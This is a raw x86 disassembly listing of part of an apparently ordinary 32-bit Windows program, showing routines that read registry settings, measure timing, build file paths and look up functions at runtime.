  405739:	pop    ebp
  40573a:	ret    0x4
  40573d:	int3   
  40573e:	int3   
  40573f:	int3   
  405740:	int3   
  405741:	int3   
  405742:	mov    edi,edi
  405744:	push   ebp
  405745:	mov    ebp,esp
  405747:	sub    esp,0x124
  40574d:	mov    eax,ds:0x407004
  405752:	xor    eax,ebp
  405754:	mov    DWORD PTR [ebp-0x4],eax
  405757:	push   ebx
  405758:	push   esi
  405759:	mov    esi,ecx
  40575b:	mov    DWORD PTR [ebp-0x120],0x11c
  405765:	push   edi
  405766:	xor    ebx,ebx
  405768:	lea    eax,[ebp-0x120]
  40576e:	xor    edi,edi
  405770:	mov    DWORD PTR [esi+0x8],0x401338
  405777:	inc    edi
  405778:	mov    DWORD PTR [esi+0xc],ebx
  40577b:	mov    DWORD PTR [esi],0x401380
  405781:	mov    DWORD PTR [esi+0x4],0x401368
  405788:	mov    DWORD PTR [esi+0x8],0x401350
  40578f:	mov    DWORD PTR [esi+0x10],edi
  405792:	push   eax
  405793:	mov    DWORD PTR [esi+0x24],ebx
  405796:	mov    DWORD PTR [esi+0x28],ebx
  405799:	call   DWORD PTR ds:0x40825c
  40579f:	test   eax,eax
  4057a1:	je     0x4057a9
  4057a3:	test   BYTE PTR [ebp-0x8],0x40
  4057a7:	jne    0x4057b8
  4057a9:	push   0x401df0
  4057ae:	call   DWORD PTR ds:0x4080d0
  4057b4:	test   eax,eax
  4057b6:	je     0x4057bb
  4057b8:	mov    DWORD PTR [esi+0x28],edi
  4057bb:	lea    eax,[ebp-0x124]
  4057c1:	push   eax
  4057c2:	push   edi
  4057c3:	push   ebx
  4057c4:	push   0x401c88
  4057c9:	push   0x80000001
  4057ce:	call   DWORD PTR ds:0x408000
  4057d4:	neg    eax
  4057d6:	push   0x64
  4057d8:	sbb    eax,eax
  4057da:	push   0xa
  4057dc:	not    eax
  4057de:	and    eax,DWORD PTR [ebp-0x124]
  4057e4:	push   0x401d04
  4057e9:	push   eax
  4057ea:	mov    DWORD PTR [ebp-0x124],eax
  4057f0:	call   0x405872
  4057f5:	push   0xffffffff
  4057f7:	push   0x10
  4057f9:	push   0x401d30
  4057fe:	push   DWORD PTR [ebp-0x124]
  405804:	mov    DWORD PTR [esi+0x14],eax
  405807:	call   0x405872
  40580c:	push   0xffffffff
  40580e:	push   0x12c
  405813:	push   0x401d5c
  405818:	push   DWORD PTR [ebp-0x124]
  40581e:	mov    DWORD PTR [esi+0x18],eax
  405821:	call   0x405872
  405826:	push   0xea60
  40582b:	push   0x2710
  405830:	push   0x401d8c
  405835:	push   DWORD PTR [ebp-0x124]
  40583b:	mov    DWORD PTR [esi+0x1c],eax
  40583e:	call   0x405872
  405843:	mov    DWORD PTR [esi+0x20],eax
  405846:	cmp    DWORD PTR [ebp-0x124],ebx
  40584c:	je     0x40585a
  40584e:	push   DWORD PTR [ebp-0x124]
  405854:	call   DWORD PTR ds:0x408008
  40585a:	mov    ecx,DWORD PTR [ebp-0x4]
  40585d:	mov    eax,esi
  40585f:	pop    edi
  405860:	pop    esi
  405861:	xor    ecx,ebp
  405863:	pop    ebx
  405864:	call   0x4063a0
  405869:	mov    esp,ebp
  40586b:	pop    ebp
  40586c:	ret    
  40586d:	int3   
  40586e:	int3   
  40586f:	int3   
  405870:	int3   
  405871:	int3   
  405872:	mov    edi,edi
  405874:	push   ebp
  405875:	mov    ebp,esp
  405877:	push   ecx
  405878:	push   ecx
  405879:	cmp    DWORD PTR [ebp+0x8],0x0
  40587d:	mov    DWORD PTR [ebp-0x4],0x4
  405884:	je     0x4058a7
  405886:	lea    eax,[ebp-0x4]
  405889:	push   eax
  40588a:	lea    eax,[ebp-0x8]
  40588d:	push   eax
  40588e:	push   0x0
  405890:	push   0x10
  405892:	push   DWORD PTR [ebp+0xc]
  405895:	push   0x0
  405897:	push   DWORD PTR [ebp+0x8]
  40589a:	call   DWORD PTR ds:0x408210
  4058a0:	test   eax,eax
  4058a2:	mov    eax,DWORD PTR [ebp-0x8]
  4058a5:	je     0x4058aa
  4058a7:	mov    eax,DWORD PTR [ebp+0x10]
  4058aa:	cmp    eax,DWORD PTR [ebp+0x14]
  4058ad:	jb     0x4058b2
  4058af:	mov    eax,DWORD PTR [ebp+0x14]
  4058b2:	mov    esp,ebp
  4058b4:	pop    ebp
  4058b5:	ret    0x10
  4058b8:	int3   
  4058b9:	int3   
  4058ba:	int3   
  4058bb:	int3   
  4058bc:	int3   
  4058bd:	int3   
  4058be:	int3   
  4058bf:	int3   
  4058c0:	mov    edi,edi
  4058c2:	push   ebp
  4058c3:	mov    ebp,esp
  4058c5:	cmp    DWORD PTR [ebp+0xc],0x0
  4058c9:	je     0x4058e5
  4058cb:	cmp    DWORD PTR [ebp+0x10],0x0
  4058cf:	je     0x4058e5
  4058d1:	push   ecx
  4058d2:	push   DWORD PTR [ebp+0x10]
  4058d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4058d8:	push   DWORD PTR [ebp+0xc]
  4058db:	lea    ecx,[ecx+0x20]
  4058de:	call   0x40553f
  4058e3:	jmp    0x405902
  4058e5:	push   esi
  4058e6:	mov    esi,DWORD PTR [ebp+0x8]
  4058e9:	cmp    DWORD PTR [esi+0x20],0x2
  4058ed:	jbe    0x4058f8
  4058ef:	push   DWORD PTR [esi+0x20]
  4058f2:	call   DWORD PTR ds:0x408008
  4058f8:	mov    DWORD PTR [esi+0x20],0x1
  4058ff:	xor    eax,eax
  405901:	pop    esi
  405902:	test   eax,eax
  405904:	jle    0x40590e
  405906:	movzx  eax,ax
  405909:	or     eax,0x80070000
  40590e:	pop    ebp
  40590f:	ret    0xc
  405912:	int3   
  405913:	int3   
  405914:	int3   
  405915:	int3   
  405916:	int3   
  405917:	int3   
  405918:	int3   
  405919:	int3   
  40591a:	int3   
  40591b:	int3   
  40591c:	int3   
  40591d:	int3   
  40591e:	int3   
  40591f:	int3   
  405920:	mov    edi,edi
  405922:	push   ebp
  405923:	mov    ebp,esp
  405925:	sub    esp,0x10
  405928:	mov    eax,ds:0x407004
  40592d:	xor    eax,ebp
  40592f:	mov    DWORD PTR [ebp-0x4],eax
  405932:	mov    ecx,DWORD PTR [ebp+0x8]
  405935:	lea    edx,[ebp-0x10]
  405938:	mov    eax,DWORD PTR [ebp+0xc]
  40593b:	add    ecx,0x20
  40593e:	push   edx
  40593f:	push   eax
  405940:	call   0x4055c0
  405945:	mov    al,BYTE PTR [ebp-0x10]
  405948:	mov    ecx,DWORD PTR [ebp-0x4]
  40594b:	not    al
  40594d:	xor    ecx,ebp
  40594f:	and    eax,0x1
  405952:	call   0x4063a0
  405957:	mov    esp,ebp
  405959:	pop    ebp
  40595a:	ret    0x8
  40595d:	int3   
  40595e:	int3   
  40595f:	int3   
  405960:	int3   
  405961:	int3   
  405962:	mov    edi,edi
  405964:	push   ebp
  405965:	mov    ebp,esp
  405967:	sub    esp,0x2c
  40596a:	mov    eax,ds:0x407004
  40596f:	xor    eax,ebp
  405971:	mov    DWORD PTR [ebp-0x4],eax
  405974:	push   ebx
  405975:	mov    ebx,DWORD PTR [ebp+0xc]
  405978:	push   esi
  405979:	mov    esi,DWORD PTR [ebp+0x8]
  40597c:	push   edi
  40597d:	call   DWORD PTR ds:0x408254
  405983:	xor    edi,edi
  405985:	mov    DWORD PTR [ebx],eax
  405987:	push   edi
  405988:	push   0x20
  40598a:	lea    eax,[ebp-0x28]
  40598d:	push   eax
  40598e:	push   0x4
  405990:	push   esi
  405991:	call   DWORD PTR ds:0x4082dc
  405997:	test   eax,eax
  405999:	js     0x4059bc
  40599b:	mov    ecx,DWORD PTR [ebp-0x10]
  40599e:	add    ecx,DWORD PTR [ebp-0x18]
  4059a1:	mov    eax,DWORD PTR [ebp-0xc]
  4059a4:	adc    eax,DWORD PTR [ebp-0x14]
  4059a7:	push   edi
  4059a8:	push   0x2710
  4059ad:	push   eax
  4059ae:	push   ecx
  4059af:	call   0x406a80
  4059b4:	mov    DWORD PTR [ebx+0x4],eax
  4059b7:	mov    DWORD PTR [ebx+0x8],edi
  4059ba:	jmp    0x4059d2
  4059bc:	push   eax
  4059bd:	call   DWORD PTR ds:0x4082e0
  4059c3:	mov    edi,eax
  4059c5:	test   edi,edi
  4059c7:	jle    0x4059d2
  4059c9:	movzx  edi,di
  4059cc:	or     edi,0x80070000
  4059d2:	mov    ecx,DWORD PTR [ebp-0x4]
  4059d5:	mov    eax,edi
  4059d7:	pop    edi
  4059d8:	pop    esi
  4059d9:	xor    ecx,ebp
  4059db:	pop    ebx
  4059dc:	call   0x4063a0
  4059e1:	mov    esp,ebp
  4059e3:	pop    ebp
  4059e4:	ret    0x8
  4059e7:	int3   
  4059e8:	int3   
  4059e9:	int3   
  4059ea:	int3   
  4059eb:	int3   
  4059ec:	int3   
  4059ed:	int3   
  4059ee:	int3   
  4059ef:	int3   
  4059f0:	mov    edi,edi
  4059f2:	push   ebp
  4059f3:	mov    ebp,esp
  4059f5:	and    esp,0xfffffff8
  4059f8:	sub    esp,0x24
  4059fb:	push   ebx
  4059fc:	push   esi
  4059fd:	push   edi
  4059fe:	mov    edi,DWORD PTR [ebp+0xc]
  405a01:	xor    esi,esi
  405a03:	test   edi,edi
  405a05:	je     0x405b12
  405a0b:	mov    ebx,DWORD PTR [ebp+0x8]
  405a0e:	cmp    DWORD PTR [ebx+0x1c],esi
  405a11:	jbe    0x405b12
  405a17:	test   DWORD PTR ds:0x407500,0x2000
  405a21:	je     0x405a2f
  405a23:	push   ecx
  405a24:	push   ecx
  405a25:	mov    ecx,0x4011a8
  405a2a:	call   0x403129
  405a2f:	call   DWORD PTR ds:0x408254
  405a35:	mov    DWORD PTR [esp+0x10],eax
  405a39:	lea    eax,[esp+0x18]
  405a3d:	push   eax
  405a3e:	push   edi
  405a3f:	call   0x405962
  405a44:	mov    esi,eax
  405a46:	mov    eax,DWORD PTR [esp+0x18]
  405a4a:	mov    DWORD PTR [esp+0xc],eax
  405a4e:	test   esi,esi
  405a50:	js     0x405afa
  405a56:	sub    eax,DWORD PTR [esp+0x10]
  405a5a:	cmp    eax,DWORD PTR [ebx+0x1c]
  405a5d:	jae    0x405af5
  405a63:	push   ecx
  405a64:	push   ecx
  405a65:	push   0x64
  405a67:	push   0x1
  405a69:	lea    edx,[esp+0x24]
  405a6d:	mov    DWORD PTR [esp+0x24],edi
  405a71:	call   0x403e9e
  405a76:	test   eax,eax
  405a78:	je     0x405af1
  405a7a:	lea    eax,[esp+0x24]
  405a7e:	push   eax
  405a7f:	push   edi
  405a80:	call   0x405962
  405a85:	mov    esi,eax
  405a87:	test   esi,esi
  405a89:	js     0x405afa
  405a8b:	mov    ecx,DWORD PTR [esp+0x24]
  405a8f:	mov    esi,ecx
  405a91:	mov    eax,DWORD PTR [esp+0x18]
  405a95:	sub    esi,eax
  405a97:	cmp    esi,0xa
  405a9a:	jb     0x405a56
  405a9c:	mov    eax,DWORD PTR [esp+0x28]
  405aa0:	xor    edx,edx
  405aa2:	sub    eax,DWORD PTR [esp+0x1c]
  405aa6:	imul   eax,eax,0x64
  405aa9:	div    esi
  405aab:	cmp    eax,DWORD PTR [ebx+0x10]
  405aae:	ja     0x405ac7
  405ab0:	mov    eax,DWORD PTR [esp+0x2c]
  405ab4:	xor    edx,edx
  405ab6:	sub    eax,DWORD PTR [esp+0x20]
  405aba:	imul   eax,eax,0x3e8
  405ac0:	div    esi
  405ac2:	cmp    eax,DWORD PTR [ebx+0x14]
  405ac5:	jbe    0x405acf
  405ac7:	mov    edx,ecx
  405ac9:	mov    DWORD PTR [esp+0xc],edx
  405acd:	jmp    0x405ad3
  405acf:	mov    edx,DWORD PTR [esp+0xc]
  405ad3:	sub    ecx,edx
  405ad5:	cmp    ecx,DWORD PTR [ebx+0x18]
  405ad8:	jae    0x405af1
  405ada:	lea    esi,[esp+0x24]
  405ade:	lea    edi,[esp+0x18]
  405ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ae5:	mov    edi,DWORD PTR [ebp+0xc]
  405ae8:	mov    eax,DWORD PTR [esp+0x18]
  405aec:	jmp    0x405a56
  405af1:	xor    esi,esi
  405af3:	jmp    0x405afa
  405af5:	mov    esi,0x800705b4
  405afa:	test   DWORD PTR ds:0x407500,0x2000
  405b04:	je     0x405b12
  405b06:	push   ecx
  405b07:	push   ecx
  405b08:	mov    ecx,0x401158
  405b0d:	call   0x403129
  405b12:	pop    edi
  405b13:	mov    eax,esi
  405b15:	pop    esi
  405b16:	pop    ebx
  405b17:	mov    esp,ebp
  405b19:	pop    ebp
  405b1a:	ret    0x8
  405b1d:	int3   
  405b1e:	int3   
  405b1f:	int3   
  405b20:	int3   
  405b21:	int3   
  405b22:	int3   
  405b23:	int3   
  405b24:	int3   
  405b25:	int3   
  405b26:	int3   
  405b27:	int3   
  405b28:	int3   
  405b29:	int3   
  405b2a:	int3   
  405b2b:	int3   
  405b2c:	int3   
  405b2d:	int3   
  405b2e:	int3   
  405b2f:	int3   
  405b30:	mov    edi,edi
  405b32:	push   ebp
  405b33:	mov    ebp,esp
  405b35:	push   DWORD PTR [ebp+0x10]
  405b38:	push   DWORD PTR [ebp+0xc]
  405b3b:	push   0x401dc0
  405b40:	push   DWORD PTR [ebp+0x8]
  405b43:	call   DWORD PTR ds:0x4080e0
  405b49:	pop    ebp
  405b4a:	ret    0xc
  405b4d:	int3   
  405b4e:	int3   
  405b4f:	int3   
  405b50:	int3   
  405b51:	int3   
  405b52:	int3   
  405b53:	int3   
  405b54:	int3   
  405b55:	int3   
  405b56:	int3   
  405b57:	int3   
  405b58:	int3   
  405b59:	int3   
  405b5a:	int3   
  405b5b:	int3   
  405b5c:	int3   
  405b5d:	int3   
  405b5e:	int3   
  405b5f:	int3   
  405b60:	mov    edi,edi
  405b62:	push   ebp
  405b63:	mov    ebp,esp
  405b65:	mov    edx,DWORD PTR [ebp+0x14]
  405b68:	xor    ecx,ecx
  405b6a:	push   esi
  405b6b:	mov    esi,DWORD PTR [ebp+0xc]
  405b6e:	push   edi
  405b6f:	mov    DWORD PTR [edx],ecx
  405b71:	mov    edi,0x40164c
  405b76:	mov    eax,DWORD PTR [esi+ecx*4]
  405b79:	cmp    eax,DWORD PTR [edi+ecx*4]
  405b7c:	jne    0x405b92
  405b7e:	inc    ecx
  405b7f:	cmp    ecx,0x4
  405b82:	jne    0x405b76
  405b84:	push   edx
  405b85:	push   DWORD PTR [ebp+0x10]
  405b88:	push   DWORD PTR [ebp+0x8]
  405b8b:	call   0x405b30
  405b90:	jmp    0x405ba3
  405b92:	mov    eax,DWORD PTR [ebp+0x8]
  405b95:	push   edx
  405b96:	push   DWORD PTR [ebp+0x10]
  405b99:	push   esi
  405b9a:	push   DWORD PTR [eax+0xc]
  405b9d:	call   DWORD PTR ds:0x4080f8
  405ba3:	pop    edi
  405ba4:	pop    esi
  405ba5:	pop    ebp
  405ba6:	ret    0x10
  405ba9:	int3   
  405baa:	int3   
  405bab:	int3   
  405bac:	int3   
  405bad:	int3   
  405bae:	mov    edi,edi
  405bb0:	push   ebx
  405bb1:	push   esi
  405bb2:	push   edi
  405bb3:	mov    ebx,edx
  405bb5:	xor    esi,esi
  405bb7:	push   0x401e00
  405bbc:	push   0x2c
  405bbe:	mov    edi,0x8007000e
  405bc3:	mov    DWORD PTR [ebx],esi
  405bc5:	call   0x406983
  405bca:	pop    ecx
  405bcb:	pop    ecx
  405bcc:	test   eax,eax
  405bce:	je     0x405bd9
  405bd0:	mov    ecx,eax
  405bd2:	call   0x405742
  405bd7:	mov    esi,eax
  405bd9:	test   esi,esi
  405bdb:	je     0x405bf1
  405bdd:	push   ebx
  405bde:	push   0x401ac0
  405be3:	push   esi
  405be4:	call   0x405b30
  405be9:	push   esi
  405bea:	mov    edi,eax
  405bec:	call   0x4056c0
  405bf1:	mov    eax,edi
  405bf3:	pop    edi
  405bf4:	pop    esi
  405bf5:	pop    ebx
  405bf6:	ret    
  405bf7:	int3   
  405bf8:	int3   
  405bf9:	int3   
  405bfa:	int3   
  405bfb:	int3   
  405bfc:	int3   
  405bfd:	int3   
  405bfe:	int3   
  405bff:	int3   
  405c00:	sub    ecx,0x8
  405c03:	jmp    0x4056eb
  405c08:	int3   
  405c09:	int3   
  405c0a:	int3   
  405c0b:	int3   
  405c0c:	int3   
  405c0d:	int3   
  405c0e:	int3   
  405c0f:	int3   
  405c10:	sub    DWORD PTR [esp+0x4],0x8
  405c15:	jmp    0x4056c0
  405c1a:	int3   
  405c1b:	int3   
  405c1c:	int3   
  405c1d:	int3   
  405c1e:	int3   
  405c1f:	int3   
  405c20:	sub    DWORD PTR [esp+0x4],0x4
  405c25:	jmp    0x405b30
  405c2a:	int3   
  405c2b:	int3   
  405c2c:	int3   
  405c2d:	int3   
  405c2e:	int3   
  405c2f:	int3   
  405c30:	sub    DWORD PTR [esp+0x4],0x8
  405c35:	jmp    0x405b30
  405c3a:	int3   
  405c3b:	int3   
  405c3c:	int3   
  405c3d:	int3   
  405c3e:	int3   
  405c3f:	int3   
  405c40:	sub    DWORD PTR [esp+0x4],0x4
  405c45:	jmp    0x4056c0
  405c4a:	int3   
  405c4b:	int3   
  405c4c:	int3   
  405c4d:	int3   
  405c4e:	int3   
  405c4f:	int3   
  405c50:	mov    edi,edi
  405c52:	push   ebp
  405c53:	mov    ebp,esp
  405c55:	mov    eax,DWORD PTR [ebp+0x8]
  405c58:	mov    ds:0x40752c,eax
  405c5d:	xor    eax,eax
  405c5f:	inc    eax
  405c60:	pop    ebp
  405c61:	ret    0x4
  405c64:	int3   
  405c65:	int3   
  405c66:	int3   
  405c67:	int3   
  405c68:	int3   
  405c69:	int3   
  405c6a:	int3   
  405c6b:	int3   
  405c6c:	int3   
  405c6d:	int3   
  405c6e:	int3   
  405c6f:	int3   
  405c70:	mov    edi,edi
  405c72:	push   ebp
  405c73:	mov    ebp,esp
  405c75:	sub    esp,0x10c
  405c7b:	mov    eax,ds:0x407004
  405c80:	xor    eax,ebp
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	cmp    BYTE PTR ds:0x407528,0x0
  405c8c:	push   edi
  405c8d:	mov    edi,0x407530
  405c92:	jne    0x405d3d
  405c98:	push   esi
  405c99:	push   0x40
  405c9b:	pop    esi
  405c9c:	push   esi
  405c9d:	push   0x0
  405c9f:	push   edi
  405ca0:	call   0x406aee
  405ca5:	and    DWORD PTR [ebp-0x10c],0x0
  405cac:	lea    eax,[ebp-0x10c]
  405cb2:	add    esp,0xc
  405cb5:	push   eax
  405cb6:	push   0x405c50
  405cbb:	push   0x6
  405cbd:	call   DWORD PTR ds:0x4081c0
  405cc3:	test   eax,eax
  405cc5:	je     0x405d35
  405cc7:	push   0x104
  405ccc:	lea    eax,[ebp-0x108]
  405cd2:	push   eax
  405cd3:	push   DWORD PTR [ebp-0x10c]
  405cd9:	call   DWORD PTR ds:0x4081c4
  405cdf:	test   eax,eax
  405ce1:	je     0x405d35
  405ce3:	lea    ecx,[ebp-0x108]
  405ce9:	lea    edx,[ecx+0x1]
  405cec:	mov    al,BYTE PTR [ecx]
  405cee:	inc    ecx
  405cef:	test   al,al
  405cf1:	jne    0x405cec
  405cf3:	sub    ecx,edx
  405cf5:	lea    edx,[ebp-0x108]
  405cfb:	add    edx,ecx
  405cfd:	jmp    0x405d06
  405cff:	cmp    BYTE PTR [edx-0x1],0x5c
  405d03:	je     0x405d10
  405d05:	dec    edx
  405d06:	lea    eax,[ebp-0x108]
  405d0c:	cmp    edx,eax
  405d0e:	ja     0x405cff
  405d10:	mov    ecx,edi
  405d12:	sub    edx,edi
  405d14:	lea    eax,[esi+0x7fffffbe]
  405d1a:	test   eax,eax
  405d1c:	je     0x405d2d
  405d1e:	mov    al,BYTE PTR [edx+ecx*1]
  405d21:	test   al,al
  405d23:	je     0x405d2d
  405d25:	mov    BYTE PTR [ecx],al
  405d27:	inc    ecx
  405d28:	sub    esi,0x1
  405d2b:	jne    0x405d14
  405d2d:	test   esi,esi
  405d2f:	jne    0x405d32
  405d31:	dec    ecx
  405d32:	mov    BYTE PTR [ecx],0x0
  405d35:	mov    BYTE PTR ds:0x407528,0x1
  405d3c:	pop    esi
  405d3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d40:	mov    eax,edi
  405d42:	xor    ecx,ebp
  405d44:	pop    edi
  405d45:	call   0x4063a0
  405d4a:	mov    esp,ebp
  405d4c:	pop    ebp
  405d4d:	ret    
  405d4e:	int3   
  405d4f:	int3   
  405d50:	int3   
  405d51:	int3   
  405d52:	int3   
  405d53:	int3   
  405d54:	int3   
  405d55:	int3   
  405d56:	int3   
  405d57:	int3   
  405d58:	int3   
  405d59:	int3   
  405d5a:	int3   
  405d5b:	int3   
  405d5c:	int3   
  405d5d:	int3   
  405d5e:	int3   
  405d5f:	int3   
  405d60:	mov    edi,edi
  405d62:	push   ebp
  405d63:	mov    ebp,esp
  405d65:	push   ecx
  405d66:	mov    eax,ds:0x407004
  405d6b:	xor    eax,ebp
  405d6d:	mov    DWORD PTR [ebp-0x4],eax
  405d70:	push   0x401e04
  405d75:	call   DWORD PTR ds:0x4081bc
  405d7b:	test   eax,eax
  405d7d:	je     0x405d9c
  405d7f:	push   esi
  405d80:	push   0x401e18
  405d85:	push   eax
  405d86:	call   0x406034
  405d8b:	mov    esi,eax
  405d8d:	test   esi,esi
  405d8f:	je     0x405d9b
  405d91:	mov    ecx,esi
  405d93:	call   DWORD PTR ds:0x4082f0
  405d99:	call   esi
  405d9b:	pop    esi
  405d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  405d9f:	xor    ecx,ebp
  405da1:	call   0x4063a0
  405da6:	mov    esp,ebp
  405da8:	pop    ebp
  405da9:	ret    
  405daa:	int3   
  405dab:	int3   
  405dac:	int3   
  405dad:	int3   
  405dae:	int3   
  405daf:	int3   
  405db0:	mov    edi,edi
  405db2:	push   ebp
  405db3:	mov    ebp,esp
  405db5:	push   ecx
  405db6:	mov    eax,ds:0x407004
  405dbb:	xor    eax,ebp
  405dbd:	mov    DWORD PTR [ebp-0x4],eax
  405dc0:	push   esi
  405dc1:	mov    esi,DWORD PTR ds:0x407520
  405dc7:	push   edi
  405dc8:	test   esi,esi
  405dca:	jne    0x405e03
  405dcc:	mov    eax,ds:0x407524
  405dd1:	xor    edi,edi
  405dd3:	test   eax,eax
  405dd5:	jne    0x405dec
  405dd7:	push   0x800
  405ddc:	push   edi
  405ddd:	push   0x401e04
  405de2:	call   0x406962
  405de7:	mov    ds:0x407524,eax
  405dec:	push   0x401e34
  405df1:	push   eax
  405df2:	call   0x406034
  405df7:	mov    esi,eax
  405df9:	mov    DWORD PTR ds:0x407520,esi
  405dff:	test   esi,esi
  405e01:	je     0x405e12
  405e03:	push   DWORD PTR [ebp+0x8]
  405e06:	mov    ecx,esi
  405e08:	call   DWORD PTR ds:0x4082f0
  405e0e:	call   esi
  405e10:	mov    edi,eax
  405e12:	mov    ecx,DWORD PTR [ebp-0x4]
  405e15:	mov    eax,edi
  405e17:	pop    edi
  405e18:	xor    ecx,ebp
  405e1a:	pop    esi
  405e1b:	call   0x4063a0
  405e20:	mov    esp,ebp
  405e22:	pop    ebp
  405e23:	ret    0x4
  405e26:	int3   
  405e27:	int3   
  405e28:	int3   
  405e29:	int3   
  405e2a:	int3   
  405e2b:	mov    edi,edi
  405e2d:	push   ebp
  405e2e:	mov    ebp,esp
  405e30:	sub    esp,0x470
  405e36:	mov    eax,ds:0x407004
  405e3b:	xor    eax,ebp
  405e3d:	mov    DWORD PTR [ebp-0x4],eax
  405e40:	push   ebx
  405e41:	mov    ebx,DWORD PTR [ebp+0x10]
  405e44:	lea    eax,[ebp-0x46c]
  405e4a:	push   esi
  405e4b:	push   0x40
  405e4d:	mov    esi,ecx
  405e4f:	push   0x0
  405e51:	push   eax
  405e52:	mov    DWORD PTR [ebp-0x41c],esi
  405e58:	call   0x406aee
  405e5d:	and    DWORD PTR [ebp-0x418],0x0
  405e64:	add    esp,0xc
  405e67:	mov    DWORD PTR [ebp-0x470],0x44
  405e71:	test   ebx,ebx
  405e73:	jne    0x405e85
  405e75:	lea    ebx,[ebp-0x42c]
  405e7b:	mov    DWORD PTR [ebp-0x418],0x1
  405e85:	push   edi
  405e86:	xor    eax,eax
  405e88:	lea    ecx,[ebp-0x414]
  405e8e:	mov    edi,ebx
  405e90:	mov    edx,0x102
  405e95:	push   esi
  405e96:	stos   DWORD PTR es:[edi],eax
  405e97:	stos   DWORD PTR es:[edi],eax
  405e98:	stos   DWORD PTR es:[edi],eax
  405e99:	stos   DWORD PTR es:[edi],eax
  405e9a:	call   0x4035c0
  405e9f:	mov    esi,eax
  405ea1:	pop    edi
  405ea2:	test   esi,esi
  405ea4:	js     0x405f37
  405eaa:	lea    eax,[ebp-0x414]
  405eb0:	push   eax
  405eb1:	call   DWORD PTR ds:0x4080dc
  405eb7:	push   0x401e50
  405ebc:	lea    ecx,[ebp-0x414]
  405ec2:	call   0x405f50
  405ec7:	mov    esi,eax
  405ec9:	test   esi,esi
  405ecb:	js     0x405f37
  405ecd:	push   0x4017ac
  405ed2:	lea    ecx,[ebp-0x414]
  405ed8:	call   0x405f50
  405edd:	mov    esi,eax
  405edf:	test   esi,esi
  405ee1:	js     0x405f37
  405ee3:	push   ebx
  405ee4:	lea    eax,[ebp-0x470]
  405eea:	push   eax
  405eeb:	xor    eax,eax
  405eed:	push   eax
  405eee:	push   eax
  405eef:	push   eax
  405ef0:	push   eax
  405ef1:	push   eax
  405ef2:	push   eax
  405ef3:	lea    eax,[ebp-0x414]
  405ef9:	push   eax
  405efa:	push   DWORD PTR [ebp-0x41c]
  405f00:	call   0x40601c
  405f05:	test   eax,eax
  405f07:	jne    0x405f1f
  405f09:	call   0x40696e
  405f0e:	mov    esi,eax
  405f10:	test   esi,esi
  405f12:	jle    0x405f37
  405f14:	movzx  esi,si
  405f17:	or     esi,0x80070000
  405f1d:	jmp    0x405f37
  405f1f:	cmp    DWORD PTR [ebp-0x418],0x0
  405f26:	je     0x405f37
  405f28:	push   DWORD PTR [ebx+0x4]
  405f2b:	call   0x406028
  405f30:	push   DWORD PTR [ebx]
  405f32:	call   0x406028
  405f37:	mov    ecx,DWORD PTR [ebp-0x4]
  405f3a:	mov    eax,esi
  405f3c:	pop    esi
  405f3d:	xor    ecx,ebp
  405f3f:	pop    ebx
  405f40:	call   0x4063a0
  405f45:	mov    esp,ebp
  405f47:	pop    ebp
  405f48:	ret    0xc
  405f4b:	int3   
  405f4c:	int3   
  405f4d:	int3   
  405f4e:	int3   
  405f4f:	int3   
  405f50:	mov    edi,edi
  405f52:	push   ebp
  405f53:	mov    ebp,esp
  405f55:	mov    edx,0x208
  405f5a:	mov    eax,ecx
  405f5c:	push   esi
  405f5d:	mov    esi,edx
  405f5f:	cmp    WORD PTR [eax],0x0
  405f63:	je     0x405f6d
  405f65:	add    eax,0x2
  405f68:	sub    esi,0x1
  405f6b:	jne    0x405f5f
  405f6d:	test   esi,esi
  405f6f:	je     0x405f86
  405f71:	mov    eax,edx
  405f73:	push   ecx
  405f74:	push   DWORD PTR [ebp+0x8]
  405f77:	sub    eax,esi
  405f79:	push   ecx
  405f7a:	sub    edx,eax
  405f7c:	lea    ecx,[ecx+eax*2]
  405f7f:	call   0x402bee
  405f84:	jmp    0x405f8b
  405f86:	mov    eax,0x80070057
  405f8b:	pop    esi
  405f8c:	pop    ebp
  405f8d:	ret    0x4
  405f90:	int3   
  405f91:	int3   
  405f92:	int3   
  405f93:	int3   
  405f94:	int3   
  405f95:	mov    edi,edi
  405f97:	push   ebp
  405f98:	mov    ebp,esp
  405f9a:	sub    esp,0xc
  405f9d:	mov    eax,ds:0x407004
  405fa2:	xor    eax,ebp
  405fa4:	mov    DWORD PTR [ebp-0x4],eax
  405fa7:	push   ebx
  405fa8:	mov    ebx,DWORD PTR [ebp+0xc]
  405fab:	lea    eax,[ebp-0xc]
  405fae:	push   edi
  405faf:	push   eax
  405fb0:	lea    eax,[ebp-0x8]
  405fb3:	and    DWORD PTR [ebx],0x0
  405fb6:	push   eax
  405fb7:	push   0x401e54
  405fbc:	push   ecx
  405fbd:	call   DWORD PTR ds:0x4080c4
  405fc3:	mov    edi,eax
  405fc5:	test   edi,edi
  405fc7:	js     0x406002
  405fc9:	mov    eax,DWORD PTR [ebp-0x8]
  405fcc:	lea    ecx,[ebp-0xc]
  405fcf:	push   esi
  405fd0:	push   ebx
  405fd1:	push   0x0
  405fd3:	mov    esi,DWORD PTR [eax]
  405fd5:	push   0x401b9c
  405fda:	push   ecx
  405fdb:	push   0x1
  405fdd:	mov    ecx,DWORD PTR [esi+0x28]
  405fe0:	push   0x0
  405fe2:	push   eax
  405fe3:	call   DWORD PTR ds:0x4082f0
  405fe9:	call   DWORD PTR [esi+0x28]
  405fec:	mov    edi,eax
  405fee:	mov    eax,DWORD PTR [ebp-0x8]
  405ff1:	push   eax
  405ff2:	mov    ecx,DWORD PTR [eax]
  405ff4:	mov    esi,DWORD PTR [ecx+0x8]
  405ff7:	mov    ecx,esi
  405ff9:	call   DWORD PTR ds:0x4082f0
  405fff:	call   esi
  406001:	pop    esi
  406002:	mov    ecx,DWORD PTR [ebp-0x4]
  406005:	mov    eax,edi
  406007:	pop    edi
  406008:	xor    ecx,ebp
  40600a:	pop    ebx
  40600b:	call   0x4063a0
  406010:	mov    esp,ebp
  406012:	pop    ebp
  406013:	ret    0x8
  406016:	int3   
  406017:	int3   
  406018:	int3   
  406019:	int3   
  40601a:	int3   
  40601b:	int3   
  40601c:	jmp    DWORD PTR ds:0x408074
  406022:	int3   
